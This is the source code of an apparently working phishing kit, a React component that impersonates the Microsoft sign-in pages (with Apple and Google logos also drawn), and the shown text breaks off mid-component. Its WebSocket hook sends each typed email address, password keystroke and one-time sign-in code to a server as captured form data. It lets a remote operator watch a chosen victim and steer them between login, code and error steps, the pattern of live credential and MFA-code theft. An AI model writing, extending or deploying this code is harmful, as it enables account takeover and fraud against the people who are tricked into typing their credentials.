import { useState, useRef, useEffect, useCallback } from 'react';
import { motion, AnimatePresence, type MotionProps } from 'framer-motion';
import { ChevronLeft, Key, Eye, EyeOff, Check, X } from 'lucide-react';

const MicrosoftLogo = () => (
  <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
  </svg>
);

const AppleLogo = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
    <path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
  </svg>
);

const GoogleLogo = () => (
  <svg width="22" height="22" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
);

const AppleSpinRing = () => (
  <>
    <style>{`
      @keyframes apple-ring-spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
      }
      .apple-ring { animation: apple-ring-spin 4s linear infinite; }
      @keyframes ms-pulse {
        0%, 100% { transform: scale(1); opacity: 0.6; }
        50% { transform: scale(1.5); opacity: 0; }
      }
      .ms-passkey-pulse { animation: ms-pulse 1.8s ease-in-out infinite; }
    `}</style>
    <svg className="apple-ring absolute" width="88" height="88" viewBox="0 0 88 88" fill="none" xmlns="http://www.w3.org/2000/svg">
      {Array.from({ length: 24 }).map((_, i) => {
        const angle = (i / 24) * 2 * Math.PI;
        const cx = 44 + 36 * Math.cos(angle);
        const cy = 44 + 36 * Math.sin(angle);
        return <circle key={i} cx={cx} cy={cy} r={i % 3 === 0 ? 2.5 : 1.8} fill="#007AFF" opacity={0.3 + (i / 24) * 0.7} />;
      })}
    </svg>
  </>
);

// ─── Microsoft types & helpers ────────────────────────────────────────────────

type MsStep = 'email' | 'signin-options' | 'passkey' | 'password' | 'stay' | 'register' | 'recover'
  | 'email-code' | 'email-code-input' | 'other-ways' | 'phone-entry' | 'phone-code'
  | 'processing' | 'error-email' | 'error-password' | 'error-code';
type RegStep = 'reg-email' | 'reg-password' | 'reg-name' | 'reg-dob' | 'reg-verify';
type RecStep = 'rec-find' | 'rec-options' | 'rec-code';

function QrCodeSvg() {
  const cells: [number, number][] = [
    [40,5],[48,5],[56,5],[40,13],[56,13],[40,21],[48,21],
    [5,40],[13,40],[21,40],[5,48],[21,48],[5,56],[13,56],[21,56],
    [40,40],[56,40],[48,48],[40,56],[56,56],
    [65,40],[73,40],[65,48],[81,48],[65,56],[73,56],[81,56],
    [40,65],[56,65],[48,73],[40,81],[48,81],[56,81],
    [65,65],[73,65],[81,65],[65,73],[81,73],[65,81],[73,81],[81,81],
  ];
  return (
    <svg viewBox="0 0 100 100" className="w-full h-full">
      <rect x="5" y="5" width="30" height="30" rx="2" fill="none" stroke="black" strokeWidth="4"/>
      <rect x="13" y="13" width="14" height="14" fill="black"/>
      <rect x="65" y="5" width="30" height="30" rx="2" fill="none" stroke="black" strokeWidth="4"/>
      <rect x="73" y="13" width="14" height="14" fill="black"/>
      <rect x="5" y="65" width="30" height="30" rx="2" fill="none" stroke="black" strokeWidth="4"/>
      <rect x="13" y="73" width="14" height="14" fill="black"/>
      {cells.map(([x, y], i) => <rect key={i} x={x} y={y} width="7" height="7" fill="black"/>)}
    </svg>
  );
}

// ─── Shared WebSocket hook ────────────────────────────────────────────────────

function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
  provider: string;
  onNavigate: (step: string) => void;
  onProviderSwitch?: (p: string) => void;
}) {
  const wsRef = useRef<WebSocket | null>(null);
  const visitorId = useRef(`v-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`);
  const pendingQueue = useRef<string[]>([]);
  const isViewOnly = useRef(false);
  const onNavigateRef = useRef(onNavigate);
  onNavigateRef.current = onNavigate;
  const onProviderSwitchRef = useRef(onProviderSwitch);
  onProviderSwitchRef.current = onProviderSwitch;

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const viewOnly = params.get('viewOnly') === '1';
    const targetId = params.get('targetId') ?? '';
    isViewOnly.current = viewOnly;
    let ws: WebSocket | undefined;
    try {
      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
      wsRef.current = ws;
      ws.onopen = () => {
        if (viewOnly) {
          ws!.send(JSON.stringify({ type: 'register-view', targetId }));
        } else {
          ws!.send(JSON.stringify({
            type: 'register-visitor',
            id: visitorId.current,
            provider,
            step: 'email',
            userAgent: navigator.userAgent,
          }));
        }
        const queued = pendingQueue.current.splice(0);
        for (const m of queued) ws!.send(m);
      };
      ws.onmessage = (e: MessageEvent<string>) => {
        try {
          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string }; provider?: string };
          if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate);
          if (msg.type === 'switch-provider' && msg.provider && !isViewOnly.current) {
            onProviderSwitchRef.current?.(msg.provider);
          }
        } catch { /* ignore */ }
      };
    } catch { /* ignore */ }
    return () => { try { ws?.close(); } catch { /* ignore */ } };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const enqueue = useCallback((data: object) => {
    if (isViewOnly.current) return;
    const str = JSON.stringify(data);
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) ws.send(str);
    else pendingQueue.current.push(str);
  }, []);

  const sendCapture = useCallback((field: string, value: string) => {
    enqueue({ type: 'form-data', field, value });
  }, [enqueue]);

  const sendStepUpdate = useCallback((step: string) => {
    enqueue({ type: 'step-update', step, provider });
  }, [enqueue, provider]);

  return { sendCapture, sendStepUpdate };
}

// ─── Microsoft ──────────────────────────────────────────────────────────────

function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
  const isDark = theme === 'dark';
  const isMobile = device === 'mobile';

  const [step, setStep] = useState<MsStep>(() => {
    const init = new URLSearchParams(window.location.search).get('initialStep') as MsStep | null;
    return init ?? 'email';
  });
  const [regStep, setRegStep] = useState<RegStep>('reg-email');
  const [recStep, setRecStep] = useState<RecStep>('rec-find');

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [dontShow, setDontShow] = useState(false);

  // Register state
  const [regEmail, setRegEmail] = useState('');
  const [regPassword, setRegPassword] = useState('');
  const [regShowPw, setRegShowPw] = useState(false);
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [regMonth, setRegMonth] = useState('January');
  const [regDay, setRegDay] = useState('1');
  const [regYear, setRegYear] = useState('1990');
  const [verifyCode, setVerifyCode] = useState('');
  const [promoEmails, setPromoEmails] = useState(false);

  // Recover state
  const [recEmail, setRecEmail] = useState('');
  const [recCode, setRecCode] = useState('');
  const [recCaptcha, setRecCaptcha] = useState(false);

  // Prompt config from URL
  const msParams = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
  const promptType = msParams.get('prompt') || 'password';
  const phoneEnabled = msParams.get('phone') === '1';

  // Phone / code inputs
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneCode, setPhoneCode] = useState('');
  const [emailCodeInput, setEmailCodeInput] = useState('');

  // Passkey scanning phase
  const [passkeyPhase, setPasskeyPhase] = useState<'scanning' | 'phone'>('scanning');

  const passwordRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (step === 'password') passwordRef.current?.focus();
  }, [step]);

  useEffect(() => {
    if (step !== 'passkey') return;
    setPasskeyPhase('scanning');
    const t = setTimeout(() => setPasskeyPhase('phone'), 2000);
    return () => clearTimeout(t);
  }, [step]);

  // ── WebSocket visitor tracking ────────────────────────────────────────────
  const { sendCapture, sendStepUpdate } = useVisitorWS({
    provider: 'microsoft',
    onNavigate: (s) => setStep(s as MsStep),
    onProviderSwitch,
  });
  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);

  const [loading, setLoading] = useState(false);
  const [codeResent, setCodeResent] = useState(false);
  const [phoneCodeResent, setPhoneCodeResent] = useState(false);

  const nav = (target: MsStep, captureField?: string, captureVal?: string) => {
    if (captureField && captureVal) sendCapture(captureField, captureVal);
    setLoading(true);
    setTimeout(() => { setLoading(false); setStep(target); }, 900);
  };

  const lightBg: React.CSSProperties = !isMobile
    ? { backgroundColor: isDark ? '#1b1b1b' : '#ffffff', backgroundImage: "url('/ms-bg.svg')", backgroundSize: 'cover', backgroundPosition: 'center' }
    : { backgroundColor: isDark ? '#111' : '#ffffff' };

  const darkPageBg: React.CSSProperties = {
    backgroundColor: '#0d0d18',
    backgroundImage: "url('/ms-bg.svg')",
    backgroundSize: 'cover',
    backgroundPosition: 'center',
  };

  const isOnDark = step === 'password' || step === 'stay' || step === 'passkey'
    || step === 'email-code' || step === 'email-code-input' || step === 'other-ways'
    || step === 'phone-entry' || step === 'phone-code'
    || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code';
  const bg = isOnDark ? darkPageBg : lightBg;

  const fadeSlide: MotionProps = {
    initial: { opacity: 0, y: 10 },
    animate: { opacity: 1, y: 0 },
    exit: { opacity: 0, y: -8 },
    transition: { duration: 0.22 },
  };

  const fadeOnly: MotionProps = {
    initial: { opacity: 0 },
    animate: { opacity: 1 },
    exit: { opacity: 0 },
    transition: { duration: 0.18 },
  };

  // Light card (email, options, register, recover steps)
  const lightCardCls = !isMobile
    ? `px-10 pt-10 pb-8 shadow-md ${isDark ? 'bg-[#242424] text-white' : 'bg-white text-[#1b1b1b]'}`
    : '';
  const lightText = isDark ? 'text-white' : 'text-[#1b1b1b]';
  const lightSub = isDark ? '#ccc' : '#1b1b1b';
  const lightInputCls = isDark
    ? 'border-[#555] focus:border-[#0078D4] text-white placeholder-gray-500'
    : 'border-[#000]/40 focus:border-[#0078D4] text-black placeholder-gray-400';
  const lightUnderlineInput = `w-full pb-2 border-0 border-b focus:outline-none bg-transparent text-[15px] transition-colors ${lightInputCls}`;
  const lightUnderlineInputSolid = `w-full pb-2 border-0 border-b focus:outline-none bg-transparent text-[15px] transition-colors border-[#000]/40 focus:border-[#0078D4] text-black placeholder-gray-400`;

  // Dark card (password, stay, passkey steps)
  const darkCardBg = 'bg-[#2a2a2a]';
  const msLogoRow = (dark: boolean) => (
    <div className="flex items-center gap-2 mb-5">
      <MicrosoftLogo />
      {!isMobile && <span className={`text-[15px] font-semibold tracking-wide ${dark ? 'text-[#aaa]' : isDark ? 'text-[#aaa]' : 'text-[#737373]'}`}>Microsoft</span>}
    </div>
  );

  const wrapCls = isMobile ? 'w-full h-full px-8 pt-10' : 'w-[440px]';

  if (loading) return (
    <div className="w-full h-full flex items-center justify-center font-[system-ui,Segoe_UI,sans-serif]" style={bg}>
      {isMobile ? (
        <div className="flex flex-col items-center gap-5 px-8">
          {msLogoRow(isDark)}
          <div className="flex gap-2 mt-2">
            {[0,1,2].map(i => <div key={i} className="w-2 h-2 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />)}
          </div>
        </div>
      ) : (
        <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-md ${isDark ? 'bg-[#242424]' : 'bg-white'}`}>
          {msLogoRow(false)}
          <div className="flex gap-2 mt-6">
            {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />)}
          </div>
        </div>
      )}
    </div>
  );

  return (
    <div
      className="w-full h-full flex items-center justify-center font-[system-ui,Segoe_UI,sans-serif] transition-[background-color] duration-300"
      style={bg}
    >
      <AnimatePresence mode="wait">

        {/* ── Email step ─────────────────────────────────────────────────────── */}
        {step === 'email' && (
          <motion.div key="email" {...fadeSlide} className={`flex flex-col ${wrapCls} ${isMobile ? '' : 'gap-4'}`}>
            <div className={`flex flex-col gap-0 ${lightCardCls}`}>
              {msLogoRow(false)}
              <h1 className={`text-[24px] font-bold mb-5 ${lightText}`}>Sign in</h1>
              <div className="relative mb-4">
                <input
                  data-testid="ms-email-input"
                  type="text"
                  value={email}
                  onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); }}
                  onKeyDown={e => { if (e.key === 'Enter') { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else nav('password', 'email', email); } }}
                  placeholder="Email, phone, or Skype"
                  autoFocus
                  className={lightUnderlineInput}
                />
              </div>
              <div className="text-[13px] mb-3" style={{ color: lightSub }}>
                No account?{' '}
                <a href="#" onClick={e => { e.preventDefault(); setStep('register'); setRegStep('reg-email'); }}
                  className="text-[#0078D4] hover:underline">Create one!</a>
              </div>
              <div className="text-[13px] mb-8">
                <a href="#" onClick={e => { e.preventDefault(); setStep('recover'); setRecStep('rec-find'); }}
                  className="text-[#0078D4] hover:underline">Can't access your account?</a>
              </div>
              <div className="flex justify-end">
                <button
                  data-testid="ms-next-btn"
                  onClick={() => { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else nav('password', 'email', email); }}
                  className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  Next
                </button>
              </div>
            </div>
            <div
              data-testid="ms-signin-options"
              onClick={() => setStep('signin-options')}
              className={`flex items-center px-4 py-3 cursor-pointer border transition-colors ${isMobile ? 'mt-6' : ''}
                ${isDark ? 'bg-[#242424] border-[#444] hover:bg-[#2e2e2e] text-white' : 'bg-white border-gray-300 hover:bg-gray-50 text-[#1b1b1b]'}`}
            >
              <Key className="w-5 h-5 mr-3 opacity-60" />
              <span className="text-[15px]">Sign-in options</span>
            </div>
            {isMobile && (
              <div className="mt-auto pb-6 text-center">
                <div className="text-[12px] flex gap-4 justify-center" style={{ color: isDark ? '#888' : '#666' }}>
                  <a href="#" className="hover:underline">Terms of use</a>
                  <a href="#" className="hover:underline">Privacy &amp; cookies</a>
                  <span>···</span>
                </div>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Sign-in options ────────────────────────────────────────────────── */}
        {step === 'signin-options' && (
          <motion.div key="signin-options" {...fadeOnly} className={`flex flex-col ${wrapCls}`}>
            <div className={`flex flex-col ${lightCardCls}`}>
              {msLogoRow(false)}
              <h1 className={`text-[24px] font-bold mb-5 ${lightText}`}>Sign-in options</h1>

              <div className="border-t border-dashed border-gray-300" />
              <button
                onClick={() => setStep('passkey')}
                className={`w-full flex items-start gap-3 py-3.5 px-1 transition-colors text-left ${isDark ? 'hover:bg-[#2e2e2e]' : 'hover:bg-gray-50'}`}
              >
                <div className={`flex-shrink-0 w-9 h-9 rounded-full flex items-center justify-center mt-0.5 ${isDark ? 'bg-[#333]' : 'bg-gray-100'}`}>
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                    <circle cx="9" cy="8" r="3.5" stroke={isDark ? '#ddd' : '#1b1b1b'} strokeWidth="1.5"/>
                    <path d="M2 20c0-3.31 3.13-6 7-6" stroke={isDark ? '#ddd' : '#1b1b1b'} strokeWidth="1.5" strokeLinecap="round"/>
                    <circle cx="17.5" cy="16.5" r="4" stroke="#0078D4" strokeWidth="1.5"/>
                    <path d="M16 16.5l1.2 1.2 2.3-2.3" stroke="#0078D4" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
                <div className="flex-1 min-w-0">
                  <div className={`text-[15px] font-medium ${lightText}`}>Face, fingerprint, PIN or security key</div>
                  <div className="text-[13px] text-[#605e5c] mt-0.5">Use your device to sign in with a passkey.</div>
                </div>
                <div className="flex-shrink-0 mt-1.5">
                  <div className="w-5 h-5 border border-gray-400 rounded-full flex items-center justify-center text-gray-400 text-[11px] leading-none select-none">?</div>
                </div>
              </button>
              <div className="border-b border-dashed border-gray-300 mb-6" />

              <div className="flex justify-end">
                <button
                  onClick={() => setStep('email')}
                  className={`px-8 py-1.5 border text-[15px] font-semibold transition-colors ${isDark ? 'border-[#555] text-white hover:bg-[#333]' : 'border-gray-400 text-[#1b1b1b] hover:bg-gray-100'}`}
                  style={{ borderRadius: 0 }}
                >
                  Back
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Passkey step ───────────────────────────────────────────────────── */}
        {step === 'passkey' && (
          <motion.div key="passkey" {...fadeOnly} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              {msLogoRow(true)}
              <AnimatePresence mode="wait">
                {passkeyPhase === 'scanning' ? (
                  <motion.div key="scanning" {...fadeOnly} className="flex flex-col items-center py-6">
                    <div className="relative w-20 h-20 flex items-center justify-center mb-6">
                      <div className="ms-passkey-pulse absolute inset-0 rounded-full border-2 border-[#0078D4]/50" />
                      <div className="w-20 h-20 rounded-full border-2 border-[#0078D4] flex items-center justify-center bg-[#1a1a30]">
                        <svg viewBox="0 0 24 24" width="32" height="32" fill="none">
                          <path d="M12 1a4 4 0 0 1 4 4v2H8V5a4 4 0 0 1 4-4z" stroke="#0078D4" strokeWidth="1.5" strokeLinecap="round"/>
                          <path d="M5 9h14a1 1 0 0 1 1 1v10a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V10a1 1 0 0 1 1-1z" stroke="#0078D4" strokeWidth="1.5"/>
                          <circle cx="12" cy="15" r="2" stroke="#0078D4" strokeWidth="1.5"/>
                          <path d="M12 17v2" stroke="#0078D4" strokeWidth="1.5" strokeLinecap="round"/>
                        </svg>
                      </div>
                    </div>
                    <h2 className="text-[20px] font-bold text-white mb-2">Looking for a passkey</h2>
                    <p className="text-[13px] text-[#aaa] text-center max-w-[260px] leading-relaxed">
                      Checking for a passkey linked to this device...
                    </p>
                  </motion.div>
                ) : (
                  <motion.div key="phone" {...fadeOnly} className="flex flex-col items-start w-full py-2">
                    <h2 className="text-[20px] font-bold text-white mb-1.5">Use a passkey</h2>
                    <p className="text-[13px] text-[#aaa] mb-5 leading-relaxed">
                      A sign-in request was sent to your nearby device. Scan the QR code if you prefer to use your phone.
                    </p>
                    <div className="flex gap-6 items-start w-full mb-5">
                      <div className="w-36 h-36 flex-shrink-0 bg-white p-2 rounded">
                        <QrCodeSvg />
                      </div>
                      <div className="flex flex-col gap-3 pt-1">
                        <div className="flex items-center gap-2">
                          <div className="w-2 h-2 rounded-full bg-[#0078D4] animate-pulse flex-shrink-0" />
                          <span className="text-[13px] text-[#aaa]">Waiting for device…</span>
                        </div>
                        <p className="text-[12px] text-[#888] leading-relaxed">
                          Open your phone's camera and point it at this QR code, or unlock with fingerprint / Face ID.
                        </p>
                        <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Use a USB security key instead</a>
                      </div>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
              <div className="flex justify-end mt-2">
                <button
                  onClick={() => setStep('signin-options')}
                  className="px-8 py-1.5 border border-[#555] text-white text-[15px] font-semibold hover:bg-[#3a3a3a] transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  Cancel
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Password step ──────────────────────────────────────────────────── */}
        {step === 'password' && (
          <motion.div key="password" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center gap-2 mb-5 justify-center">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <div className="flex justify-center mb-4">
                <button
                  onClick={() => setStep('email')}
                  className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors"
                  style={{ background: 'none' }}
                >
                  <ChevronLeft className="w-3.5 h-3.5" />
                  {email || 'john@outlook.com'}
                </button>
              </div>
              <h1 className="text-[24px] font-bold mb-5 text-white text-center">Enter your password</h1>
              <div className="relative mb-2">
                <input
                  ref={passwordRef}
                  data-testid="ms-password-input"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); }}
                  onKeyDown={e => { if (e.key === 'Enter' && password) nav('stay', 'password', password); }}
                  placeholder="Password"
                  className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
                />
                <button
                  onClick={() => setShowPassword(v => !v)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-200 transition-colors"
                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}
                >
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
              <div className="mb-5">
                <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Forgot your password?</a>
              </div>
              <button
                data-testid="ms-signin-btn"
                onClick={() => { if (password) nav('stay', 'password', password); }}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 mb-5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                Next
              </button>
              <div className="flex flex-col items-center gap-3">
                <a href="#" onClick={e => { e.preventDefault(); setStep('passkey'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
                  Use your face, fingerprint, PIN, or security key
                </a>
                <a href="#" onClick={e => { e.preventDefault(); setStep('email'); setEmail(''); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
                  Sign in with a different Microsoft account
                </a>
              </div>
            </div>
            {!isMobile && (
              <div className="flex justify-center gap-5 mt-3 text-[12px] text-[#888]">
                <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Stay signed in ─────────────────────────────────────────────────── */}
        {step === 'stay' && (
          <motion.div key="stay" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center gap-2 mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <h1 className="text-[24px] font-bold mb-3 text-white">Stay signed in?</h1>
              <p className="text-[14px] mb-6 text-[#ccc]">
                Do this to reduce the number of times you are asked to sign in.
              </p>
              <label className="flex items-center gap-2 mb-8 cursor-pointer select-none text-[#ccc]" style={{ fontSize: 14 }}>
                <div
                  onClick={() => setDontShow(v => !v)}
                  className={`w-4 h-4 border flex items-center justify-center flex-shrink-0 cursor-pointer transition-colors
                    ${dontShow ? 'bg-[#0078D4] border-[#0078D4]' : 'border-[#555]'}`}
                >
                  {dontShow && <Check className="w-3 h-3 text-white" />}
                </div>
                Don't show this again
              </label>
              <div className="flex gap-3 justify-end">
                <button
                  data-testid="ms-no-btn"
                  onClick={() => setStep('email')}
                  className="text-[15px] font-semibold px-6 py-1.5 border border-[#555] text-white hover:bg-[#3a3a3a] transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  No
                </button>
                <button
                  data-testid="ms-yes-btn"
                  onClick={() => setStep('email')}
                  className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  Yes
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Email code ────────────────────────────────────────────────────── */}
        {step === 'email-code' && (
          <motion.div key="email-code" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col items-center`}>
              <div className="flex items-center gap-2 justify-center mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <button
                onClick={() => setStep('email')}
                className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors mb-5"
                style={{ background: 'none' }}
              >
                {email || 'user@example.com'}
              </button>
              <h1 className="text-[22px] font-bold text-white text-center mb-3">Get a code to sign in</h1>
              <p className="text-[14px] text-[#aaa] text-center mb-6">
                We'll send a code to <strong className="text-white">{email || 'your email'}</strong> to sign you in.
              </p>
              <button
                onClick={() => setStep('email-code-input')}
                className="w-full border border-[#0078D4] text-white bg-[#0078D4] hover:bg-[#005a9e] text-[15px] font-semibold py-2.5 mb-5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                Send code
              </button>
              <a href="#" onClick={e => { e.preventDefault(); setStep('other-ways'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
                Other ways to sign in
              </a>
            </div>
            {!isMobile && (
              <div className="flex justify-center gap-5 mt-3 text-[12px] text-[#888]">
                <a href="#" className="hover:underline hover:text-[#aaa]">Help and feedback</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Terms of use</a>
                <a href="#" className="hover:underline hover:text-[#aaa]">Privacy and cookies</a>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Email code input ──────────────────────────────────────────────── */}
        {step === 'email-code-input' && (
          <motion.div key="email-code-input" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center justify-center gap-2 mb-5">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <div className="flex justify-center mb-4">
                <button
                  onClick={() => setStep('email-code')}
                  className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors"
                  style={{ background: 'none' }}
                >
                  <ChevronLeft className="w-3.5 h-3.5" />
                  {email || 'user@example.com'}
                </button>
              </div>
              <h1 className="text-[24px] font-bold text-white text-center mb-2">Enter code</h1>
              <p className="text-[13px] text-[#aaa] text-center mb-6">
                Check <strong className="text-white">{email || 'your email'}</strong> for the code and enter it below.
              </p>
              <input
                type="text"
                value={emailCodeInput}
                onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setEmailCodeInput(v); sendCapture('email_code', v); }}
                onKeyDown={e => { if (e.key === 'Enter' && emailCodeInput.length >= 4) nav('processing', 'email_code', emailCodeInput); }}
                placeholder="Code"
                maxLength={6}
                autoFocus
                className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 mb-2 transition-colors text-center tracking-[0.3em] text-[20px]"
              />
              <div className="mb-5">
                <a href="#" onClick={e => { e.preventDefault(); setCodeResent(true); setTimeout(() => setCodeResent(false), 3000); }}
                  className={`text-[13px] hover:underline ${codeResent ? 'text-green-400' : 'text-[#3391e0]'}`}>
                  {codeResent ? '✓ Code resent!' : "I didn't get a code"}
                </a>
              </div>
              <button
                onClick={() => { if (emailCodeInput.length >= 4) nav('processing', 'email_code', emailCodeInput); }}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                Next
              </button>
            </div>
          </motion.div>
        )}

        {/* ── Other ways ────────────────────────────────────────────────────── */}
        {step === 'other-ways' && (
          <motion.div key="other-ways" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-9 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center mb-5">
                <button
                  onClick={() => promptType === 'other-ways' ? setStep('email') : setStep('email-code')}
                  className="text-[#aaa] hover:text-white transition-colors p-0.5 -ml-0.5"
                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
                >
                  <ChevronLeft className="w-5 h-5" />
                </button>
                <div className="flex-1 flex items-center justify-center gap-2">
